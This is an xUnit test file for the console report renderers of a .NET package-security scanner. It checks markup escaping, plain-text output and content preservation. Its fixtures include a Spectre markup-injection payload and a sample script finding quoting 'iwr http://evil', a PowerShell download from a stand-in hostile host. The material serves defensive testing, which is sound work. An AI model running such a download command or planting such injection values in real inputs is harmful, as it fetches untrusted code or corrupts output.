namespace Silvergun.CLI.Tests;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

using Spectre.Console;

using Silvergun.CLI.Reports;
using Silvergun.CodeAnalysis.IL;
using Silvergun.Intel;
using Silvergun.PackageAnalysis.NuGet;
using Silvergun.PackageAnalysis.NuGet.Squats;

using Xunit;

/// <summary>
/// Behavioral tests for the Spectre.Console verb renderers (ADR 0013). These assert security/correctness
/// INVARIANTS — markup-injection safety, plain (no-ANSI/no-color) file output, and content preservation —
/// not layout/color/wording, which are validated interactively per CLAUDE.md. Each renderer is driven
/// directly against a Spectre console configured exactly like the CLI's <c>--output</c>/NO_COLOR path
/// (<see cref="AnsiSupport.No"/> + <see cref="ColorSystemSupport.NoColors"/> over a <see cref="StringWriter"/>).
/// </summary>
public sealed class ReportRendererTests
{
    #region Methods — markup-injection safety (highest value)
    // Untrusted report fields (names, paths, ids, called APIs, reasons) that carry markup metacharacters must
    // render LITERALLY: unescaped, the trailing unterminated tag would make Spectre throw InvalidOperationException,
    // and "[red]" would be interpreted as a color rather than shown. Passing proves every seam runs Markup.Escape.

    [Fact]
    public void AssemblyRenderer_WithMarkupMetacharactersInData_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        var caps = new CapabilityReport(
            Inject, Inject, Epoch,
            [new ApiCallFinding(Capability.ProcessExecution, ApiCallKind.Call, Inject, Inject, Inject)],
            1, 1, 0, []);
        var obf = new ObfuscationReport(
            Inject, Inject, Epoch,
            [new ObfuscationFinding(HiddenContentKind.EncodedExecutable, Inject, Inject, Inject, 128, 7.9)]);
        var report = new AssemblyAnalysisReport(Meta(Inject), caps, obf);

        var ex = Record.Exception(() => AssemblyReportRenderer.Render(console, report));

        AssertRenderedLiterally(ex, writer);
    }

    [Fact]
    public void PackageRenderer_WithMarkupMetacharactersInData_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        var report = InjectionPackageReport();

        var ex = Record.Exception(() => PackageReportRenderer.Render(console, report, Inject));

        AssertRenderedLiterally(ex, writer);
    }

    [Fact]
    public void SquatRenderer_WithMarkupMetacharactersInData_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        var finding = new SquatFinding(Inject, Inject, 1, 2, Inject, MutatorType.Unspecified, 5, 3);
        var report = new SquatCheckReport(Inject, Epoch, [finding]);

        var ex = Record.Exception(() => SquatReportRenderer.Render(console, report));

        AssertRenderedLiterally(ex, writer);
    }
    #endregion

    #region Methods — no-ANSI / no-color output invariant
    // The --output (and NO_COLOR) path renders through a no-ANSI/no-color console; files must never carry escape
    // codes, and Spectre must consume all style tags (none leak into the plain text). Covers all three verbs.

    [Fact]
    public void AssemblyRenderer_PlainConsole_EmitsNoEscapeBytesOrLeftoverMarkup()
    {
        var (console, writer) = PlainConsole();
        AssemblyReportRenderer.Render(console, CleanAssemblyReport());
        AssertPlainText(writer);
    }

    [Fact]
    public void PackageRenderer_PlainConsole_EmitsNoEscapeBytesOrLeftoverMarkup()
    {
        var (console, writer) = PlainConsole();
        PackageReportRenderer.Render(console, PopulatedPackageReport(), "Evil.Package.1.2.3.nupkg");
        AssertPlainText(writer);
    }

    [Fact]
    public void SquatRenderer_PlainConsole_EmitsNoEscapeBytesOrLeftoverMarkup()
    {
        var (console, writer) = PlainConsole();
        SquatReportRenderer.Render(console, PopulatedSquatReport());
        AssertPlainText(writer);
    }
    #endregion

    #region Methods — mode invariants (ADR 0014: ascii-default vs rich)
    // The default (no --rich) console mirrors Program.CreateConsole's plain path exactly — Ansi.No + NoColors +
    // Profile.Capabilities.Unicode=false — so ReportTheme.IsRich is false and every glyph/border degrades to ASCII.
    // Output for all three verbs must be pure 7-bit ASCII: no 0x1b, no byte > 0x7F, and no leftover markup tags.

    [Fact]
    public void AssemblyRenderer_AsciiConsole_EmitsSevenBitAsciiOnly()
    {
        var (console, writer) = AsciiConsole();
        AssemblyReportRenderer.Render(console, CleanAssemblyReport());
        AssertSevenBitAscii(writer);
    }

    [Fact]
    public void PackageRenderer_AsciiConsole_EmitsSevenBitAsciiOnly()
    {
        var (console, writer) = AsciiConsole();
        PackageReportRenderer.Render(console, PopulatedPackageReport(), "Evil.Package.1.2.3.nupkg");
        AssertSevenBitAscii(writer);
    }

    [Fact]
    public void SquatRenderer_AsciiConsole_EmitsSevenBitAsciiOnly()
    {
        var (console, writer) = AsciiConsole();
        SquatReportRenderer.Render(console, PopulatedSquatReport());
        AssertSevenBitAscii(writer);
    }

    // The rich console mirrors Program.CreateConsole's --rich path (Ansi.Yes + a color system + Unicode=true).
    // ReportTheme.Esc must still neutralize markup metacharacters in untrusted fields — the unterminated tag in
    // the payload would otherwise make Spectre's parser throw even when color is enabled.

    [Fact]
    public void AssemblyRenderer_RichConsole_WithInjectionPayload_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = RichConsole();
        var caps = new CapabilityReport(
            Inject, Inject, Epoch,
            [new ApiCallFinding(Capability.ProcessExecution, ApiCallKind.Call, Inject, Inject, Inject)],
            1, 1, 0, []);
        var obf = new ObfuscationReport(
            Inject, Inject, Epoch,
            [new ObfuscationFinding(HiddenContentKind.EncodedExecutable, Inject, Inject, Inject, 128, 7.9)]);
        var report = new AssemblyAnalysisReport(Meta(Inject), caps, obf);

        var ex = Record.Exception(() => AssemblyReportRenderer.Render(console, report));

        AssertRenderedLiterally(ex, writer);
    }

    [Fact]
    public void PackageRenderer_RichConsole_WithInjectionPayload_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = RichConsole();

        var ex = Record.Exception(() => PackageReportRenderer.Render(console, InjectionPackageReport(), Inject));

        AssertRenderedLiterally(ex, writer);
    }

    [Fact]
    public void SquatRenderer_RichConsole_WithInjectionPayload_RendersLiterallyWithoutThrowing()
    {
        var (console, writer) = RichConsole();
        var finding = new SquatFinding(Inject, Inject, 1, 2, Inject, MutatorType.Unspecified, 5, 3);
        var report = new SquatCheckReport(Inject, Epoch, [finding]);

        var ex = Record.Exception(() => SquatReportRenderer.Render(console, report));

        AssertRenderedLiterally(ex, writer);
    }
    #endregion

    #region Methods — content preservation (coarse, non-brittle)
    // A report WITH findings must surface its key identifiers as substrings; identifiers are kept short so table
    // wrapping can't split them. Empty/clean reports must render without throwing and signal a stable "clean"/"none".

    [Fact]
    public void AssemblyRenderer_WithFindings_PreservesKeyIdentifiers()
    {
        var (console, writer) = PlainConsole();
        AssemblyReportRenderer.Render(console, CleanAssemblyReport());
        var output = writer.ToString();

        Assert.NotEqual(0, output.Length);
        Assert.Contains("Evil.Sample.dll", output);              // assembly identity
        Assert.Contains("System.IO.File.ReadAllText", output);   // the called API of the finding
    }

    [Fact]
    public void PackageRenderer_WithFindings_PreservesKeyIdentifiers()
    {
        var (console, writer) = PlainConsole();
        PackageReportRenderer.Render(console, PopulatedPackageReport(), "Evil.Package.1.2.3.nupkg");
        var output = writer.ToString();

        Assert.NotEqual(0, output.Length);
        Assert.Contains("Evil.Package", output);                 // package identity
        Assert.Contains("Newtonsoft.Json", output);              // a declared dependency id
        Assert.Contains("SIL9001", output);                      // a script-finding rule id
        Assert.Contains("System.Net.Http", output);              // a capability finding's called API
    }

    [Fact]
    public void SquatRenderer_WithFindings_PreservesKeyIdentifiers()
    {
        var (console, writer) = PlainConsole();
        SquatReportRenderer.Render(console, PopulatedSquatReport());
        var output = writer.ToString();

        Assert.NotEqual(0, output.Length);
        Assert.Contains("Newtonsoft.Json", output);              // the popular candidate a squat targets
    }

    [Fact]
    public void AssemblyRenderer_CleanReport_IndicatesCleanWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        // FIXTURE CORRECTED for ADR 0024 (the assertion is unchanged): this previously passed Obfuscation: null and
        // still expected "Clean" — i.e. it asserted a clean verdict on a report where the obfuscation analysis never
        // completed, which is the false-clean ADR 0024 removes (all 3 methods analyzed, but one analysis did not run).
        // A findings-free ObfuscationReport means "the analysis RAN and found nothing", which is what "clean" requires
        // — the same pattern PackageRenderer_CleanReport_... already uses for VulnerabilitiesStatus: Completed.
        var caps = new CapabilityReport("Benign.dll", "/x/Benign.dll", Epoch, [], 3, 3, 0, []);
        var ranAndFoundNothing = new ObfuscationReport("Benign.dll", "/x/Benign.dll", Epoch, []);
        var report = new AssemblyAnalysisReport(Meta("Benign.dll"), caps, ranAndFoundNothing);

        var ex = Record.Exception(() => AssemblyReportRenderer.Render(console, report));

        Assert.Null(ex);
        Assert.Contains("Clean", writer.ToString());   // stable footer headline the renderer emits
    }

    [Fact]
    public void PackageRenderer_CleanReport_IndicatesCleanWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        var pkg = new PackageIdentityInfo("Benign.Package", "1.0.0", "Author", null, []);
        // A fully-clean scan is also a VERIFIED one: the OSV check completed and found nothing. Without Completed the
        // footer would (correctly) read "not verified", so the clean headline requires an actually-completed vuln check.
        var report = new PackageCapabilityReport(pkg, Epoch, [], [], [],
            VulnerabilitiesStatus: VulnerabilityScanStatus.Completed);

        var ex = Record.Exception(() => PackageReportRenderer.Render(console, report, "Benign.nupkg"));

        Assert.Null(ex);
        Assert.Contains("Clean", writer.ToString());
    }

    [Fact]
    public void SquatRenderer_CleanReport_IndicatesNoneWithoutThrowing()
    {
        var (console, writer) = PlainConsole();
        var report = new SquatCheckReport("Benign.Package", Epoch, []);

        var ex = Record.Exception(() => SquatReportRenderer.Render(console, report));

        Assert.Null(ex);
        Assert.Contains("No likely typosquat targets found.", writer.ToString());
    }
    #endregion

    #region Methods — helpers
    // A Spectre console configured exactly like Program.CreatePlainConsole: no ANSI, no color, buffered to a
    // StringWriter. Markup PARSING still runs (color is separate), so unescaped metacharacters would still throw
    // here — which is what makes this the right seam for the injection tests too. Width is widened so the coarse
    // content-preservation substring checks aren't defeated by table wrapping.
    private static (IAnsiConsole Console, StringWriter Writer) PlainConsole()
    {
        var writer = new StringWriter();
        var console = AnsiConsole.Create(new AnsiConsoleSettings
        {
            Ansi = AnsiSupport.No,
            ColorSystem = ColorSystemSupport.NoColors,
            Out = new AnsiConsoleOutput(writer),
        });
        console.Profile.Width = 240;
        return (console, writer);
    }

    // The default (no --rich) console, mirroring Program.CreateConsole's plain path: no ANSI, no color, and — the
    // part PlainConsole leaves implicit — Profile.Capabilities.Unicode = false, so ReportTheme.IsRich is false and
    // every border/glyph degrades to its ASCII equivalent. Width is pinned for deterministic, redirection-stable output.
    private static (IAnsiConsole Console, StringWriter Writer) AsciiConsole()
    {
        var writer = new StringWriter();
        var console = AnsiConsole.Create(new AnsiConsoleSettings
        {
            Ansi = AnsiSupport.No,
            ColorSystem = ColorSystemSupport.NoColors,
            Out = new AnsiConsoleOutput(writer),
        });
        console.Profile.Capabilities.Unicode = false;
        console.Profile.Width = 240;
        return (console, writer);
    }

    // The --rich console, mirroring Program.CreateConsole's rich path: ANSI + a color system + Unicode = true, so
    // ReportTheme.IsRich is true and rich borders/glyphs are selected. Buffered to a StringWriter for inspection.
    private static (IAnsiConsole Console, StringWriter Writer) RichConsole()
    {
        var writer = new StringWriter();
        var console = AnsiConsole.Create(new AnsiConsoleSettings
        {
            Ansi = AnsiSupport.Yes,
            ColorSystem = ColorSystemSupport.Standard,
            Out = new AnsiConsoleOutput(writer),
        });
        console.Profile.Capabilities.Unicode = true;
        console.Profile.Width = 240;
        return (console, writer);
    }

    private static void AssertSevenBitAscii(StringWriter writer)
    {
        var output = writer.ToString();
        Assert.NotEqual(0, output.Length);
        Assert.False(output.Contains((char)27), "output must contain no ANSI escape byte (0x1b)");
        var offender = output.FirstOrDefault(c => c > (char)0x7f);
        Assert.True(offender == '\0', $"default output must be 7-bit ASCII; found char U+{(int)offender:x4}.");
        Assert.DoesNotContain("[/]", output);       // Spectre consumed every style tag
        Assert.DoesNotContain("[grey]", output);
        Assert.DoesNotContain("[bold]", output);
    }

    private static void AssertRenderedLiterally(Exception? renderException, StringWriter writer)
    {
        Assert.Null(renderException);   // unescaped markup would have thrown InvalidOperationException
        var output = writer.ToString();
        Assert.Contains("PWNED", output);    // the payload text survived rendering
        Assert.Contains("[red]", output);    // and its markup was shown literally, not interpreted as color
    }

    private static void AssertPlainText(StringWriter writer)
    {
        var output = writer.ToString();
        Assert.NotEqual(0, output.Length);
        Assert.False(output.Contains((char)27), "output must contain no ANSI escape byte (0x1b)");
        Assert.DoesNotContain("[/]", output);       // Spectre consumed every style tag
        Assert.DoesNotContain("[grey]", output);
        Assert.DoesNotContain("[bold]", output);
    }

    private static AssemblyMetadataInfo Meta(string name) => new(
        Name: name, Version: "1.0.0.0", Culture: null, PublicKeyToken: null,
        IsStrongNameSigned: false, ModuleKind: "DynamicallyLinkedLibrary",
        IsILOnly: true, Requires32Bit: false, Requires64Bit: false,
        RequiresAmdInstructionSet: false, ContainsForeignTypes: false,
        HasEntryPoint: false, TargetRuntimeVersion: "v4.0.30319",
        DebugInformationLocation: null, CustomAttributes: [], References: []);

    // An analyze report with clean (bracket-free) identifiers and one finding of each kind.
    private static AssemblyAnalysisReport CleanAssemblyReport()
    {
        var caps = new CapabilityReport(
            "Evil.Sample.dll", "lib/Evil.Sample.dll", Epoch,
            [new ApiCallFinding(Capability.FileSystem, ApiCallKind.Call, "Evil.Loader", "Run", "System.IO.File.ReadAllText")],
            5, 5, 0, []);
        var obf = new ObfuscationReport(
            "Evil.Sample.dll", "lib/Evil.Sample.dll", Epoch,
            [new ObfuscationFinding(HiddenContentKind.EncodedExecutable, "Windows PE", "Evil.Loader", "Decode", 512, 7.8)]);
        return new AssemblyAnalysisReport(Meta("Evil.Sample.dll"), caps, obf);
    }

    // A scan-package report with clean identifiers: one dependency, one packaged script, one script finding,
    // and one packaged assembly carrying a capability finding.
    private static PackageCapabilityReport PopulatedPackageReport()
    {
        var dep = new PackageDependencyInfo("Newtonsoft.Json", "12.0.0", "net10.0");
        var pkg = new PackageIdentityInfo("Evil.Package", "1.2.3", "Bad Actor", "A helpful-looking package.", [dep]);
        var script = new PackageScript("tools/install.ps1", "/x/tools/install.ps1", PackageItemRole.Tools);
        var scriptFinding = new ScriptFinding(
            "SIL9001", "Suspicious remote download", "Critical", "High", "tools/install.ps1", 3, "iwr http://evil", []);
        var asm = new PackageAssembly("lib/net10.0/Evil.dll", "/x/lib/net10.0/Evil.dll", "net10.0", PackageItemRole.Lib, "abc123");
        var capRep = new CapabilityReport(
            "Evil.dll", "lib/net10.0/Evil.dll", Epoch,
            [new ApiCallFinding(Capability.Network, ApiCallKind.Call, "Evil.Client", "Beacon", "System.Net.Http.HttpClient")],
            4, 4, 0, []);
        var scan = new AssemblyScanResult(asm, capRep, null, Meta("Evil.dll"), null);
        return new PackageCapabilityReport(pkg, Epoch, [scan], [script], [scriptFinding]);
    }

    private static SquatCheckReport PopulatedSquatReport()
    {
        var finding = new SquatFinding(
            "newtonsoftt.json", "Newtonsoft.Json", 42, 5_000_000, "one-char insertion", MutatorType.Unspecified);
        return new SquatCheckReport("newtonsoftt.json", Epoch, [finding]);
    }

    // A scan-package report whose every untrusted field carries markup metacharacters.
    private static PackageCapabilityReport InjectionPackageReport()
    {
        var dep = new PackageDependencyInfo(Inject, Inject, Inject);
        var pkg = new PackageIdentityInfo(Inject, Inject, Inject, Inject, [dep]);
        var script = new PackageScript(Inject, Inject, PackageItemRole.Tools);
        // Severity stays a valid RulesEngine name (engine-controlled vocabulary, not attacker data).
        var scriptFinding = new ScriptFinding(Inject, Inject, "Critical", "High", Inject, 1, Inject, []);
        var asm = new PackageAssembly(Inject, Inject, Inject, PackageItemRole.Lib, "hash");
        var capRep = new CapabilityReport(
            Inject, Inject, Epoch,
            [new ApiCallFinding(Capability.Network, ApiCallKind.Call, Inject, Inject, Inject)],
            1, 1, 0, []);
        var obf = new ObfuscationReport(
            Inject, Inject, Epoch,
            [new ObfuscationFinding(HiddenContentKind.HighEntropyBlob, Inject, Inject, Inject, 10, 5.0)]);
        var scan = new AssemblyScanResult(asm, capRep, null, Meta(Inject), obf);
        return new PackageCapabilityReport(pkg, Epoch, [scan], [script], [scriptFinding]);
    }
    #endregion

    #region Fields
    // A payload combining an interpreted-color attempt ("[red]...[/]") with an unterminated tag: unescaped, the
    // trailing "[unterminated" makes Spectre's markup parser throw, so a passing render proves the data was escaped.
    private const string Inject = "[red]PWNED[/][unterminated";

    private static readonly DateTimeOffset Epoch = DateTimeOffset.UnixEpoch;
    #endregion
}
